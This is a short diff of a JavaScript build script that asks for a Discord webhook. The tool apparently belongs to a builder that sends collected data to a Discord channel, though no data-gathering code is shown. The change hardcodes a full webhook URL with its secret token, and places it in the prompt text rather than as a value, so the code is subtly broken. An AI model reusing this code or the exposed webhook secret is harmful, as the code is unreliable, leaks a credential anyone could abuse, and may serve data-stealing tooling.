@@ -39,7 +39,7 @@ cfonts.say('Build', {
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-const webhook = question(chalk.bold.yellow('[?] Enter webhook: '))
+const webhook = question(chalk.bold.yellow('https://discord.com/api/webhooks/1439354104068571248/SiDSBzeY9fLRZRVvZNCDjTMPn8L_xRD_4VelMFJlJ3dlWqybpyJTr2kpD0gfDukL902v'))
 
 if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
   console.log(chalk.bold.red('[@] Webhook is invalid or has not been informed.'))
